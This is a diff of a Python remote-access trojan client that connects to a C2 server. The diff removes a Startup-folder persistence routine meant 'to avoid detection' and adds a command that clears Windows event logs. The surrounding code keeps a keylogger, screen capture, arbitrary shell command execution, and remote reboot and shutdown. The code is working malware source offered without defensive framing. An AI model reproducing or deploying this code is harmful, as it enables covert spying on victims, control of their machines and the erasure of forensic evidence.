@@ -9,16 +9,10 @@ import platform
 import getpass
 import clipboard
 from pynput import keyboard
-import random
-import string
 
 # Global variable to store key logs
 key_logs = []
 key_logging = False
-
-def generate_random_name():
-    """Generate a random file name to avoid detection."""
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
 def send_screenshare(client_socket):
     """Capture and send screen to the C2 server."""
@@ -31,46 +25,33 @@ def send_screenshare(client_socket):
     except Exception as e:
         print(f"[!] Error during screenshare: {e}")
 
-def enable_persistence():
-    """Enable persistence on the target system."""
-    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    script_name = generate_random_name() + ".exe"  # Random file name for the persistence script
-    script_path = os.path.abspath(__file__)
-    
-    if not os.path.exists(startup_path):
-        os.makedirs(startup_path)
-    
-    # Copy script to a random file name in the Startup folder
-    shutil.copy(script_path, os.path.join(startup_path, script_name))
-    return "Persistence enabled."
-
 def execute_command(command):
     """Execute a shell command."""
-    try:
-        result = subprocess.getoutput(command)
-        return result
-    except Exception as e:
-        return f"Error executing command: {e}"
+    result = subprocess.getoutput(command)
+    return result
+
+def wipe_event_logs():
+    """Wipe event logs on the target system."""
+    if os.name == 'nt':
+        subprocess.call(["wevtutil", "clear-log", "Application"])
+        subprocess.call(["wevtutil", "clear-log", "System"])
+        return "Event logs cleared."
+    else:
+        return "Event log clearing only supported on Windows."
 
 def reboot_system():
     """Reboot the target system."""
-    try:
-        if os.name == 'nt':
-            subprocess.call(["shutdown", "/r", "/t", "0"])
-        else:
-            subprocess.call(["sudo", "reboot"])
-    except Exception as e:
-        return f"Error rebooting system: {e}"
+    if os.name == 'nt':
+        subprocess.call(["shutdown", "/r", "/t", "0"])
+    else:
+        subprocess.call(["sudo", "reboot"])
 
 def shutdown_system():
     """Shut down the target system."""
-    try:
-        if os.name == 'nt':
-            subprocess.call(["shutdown", "/s", "/t", "0"])
-        else:
-            subprocess.call(["sudo", "shutdown", "now"])
-    except Exception as e:
-        return f"Error shutting down system: {e}"
+    if os.name == 'nt':
+        subprocess.call(["shutdown", "/s", "/t", "0"])
+    else:
+        subprocess.call(["sudo", "shutdown", "now"])
 
 def get_pc_info():
     """Retrieve system information."""
@@ -115,6 +96,7 @@ def start_keylogger():
             elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                 key_logs.append(key.char)
         except AttributeError:
+            # Ignore special keys like caps lock, num lock, etc.
             pass
 
     # Start listener in a separate thread
@@ -168,8 +150,8 @@ def client_loop(server_ip, server_port):
                 _, *dest = command.split()
                 os.chdir(dest[0] if dest else os.getcwd())
                 client.send(b"Shell started.")
-            elif command.lower() == "persist":
-                client.send(enable_persistence().encode())
+            elif command.lower() == "clearev":
+                client.send(wipe_event_logs().encode())
             elif command.lower() == "reboot":
                 reboot_system()
             elif command.lower() == "shutdown":
@@ -197,7 +179,7 @@ Available Commands:
 - ps: List all processes.
 - run <filename>: Execute a file on the client.
 - shell [-d <path>]: Start a shell session; optionally specify a path.
-- persist: Enable persistence on the client system.
+- clearev: Clear event logs on the client system.
 - reboot: Reboot the client system.
 - shutdown: Shut down the client system.
 - screenshare: Start a live screen-sharing session.
